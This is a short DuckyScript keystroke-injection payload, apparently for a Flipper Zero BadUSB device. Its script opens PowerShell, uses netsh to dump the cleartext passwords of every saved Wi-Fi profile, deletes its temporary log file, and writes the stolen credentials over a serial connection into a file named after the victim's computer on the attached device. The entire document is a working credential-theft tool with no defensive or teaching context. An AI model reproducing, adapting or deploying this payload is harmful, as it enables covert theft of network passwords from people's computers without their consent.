GUI r

DELAY 200

STRING powershell -NoP -NonI

ENTER

DELAY 1500

STRING $currentWifi = (get-netconnectionProfile).Name;

STRING $rememberedWifis = (netsh.exe wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize;

STRING echo "Current WI-FI: `"$currentWifi`"" > $home/tmp-log.txt;

STRING echo $rememberedWifis >> $home/tmp-log.txt;

STRING $output = (Get-Content $home/tmp-log.txt|Out-String);
 
STRING Remove-Item -Path $home/tmp-log.txt;

STRING $SUSB="USB\VID_0483&PID_5740";

STRING $SPATH="/ext/apps_data/wifi_creds/$env:computername.txt";

REM ## Perform 600 loops, to check if Flipper storage is available, if not wait 1 sec.

STRING 1..600 | % { Try { $serialPort = New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly -Class 'Ports' -InstanceID "$SUSB*" -ErrorAction SilentlyContinue) -split "COM")[1][0])", 115200, 'None', 8, 'one'); $serialPort.open(); $serialPort.Write("storage write $SPATH `r`n"); $serialPort.Write("$output"); $serialPort.Write("$([char] 3)"); $serialPort.Close(); exit }Catch { Sleep 1 } }

ENTER
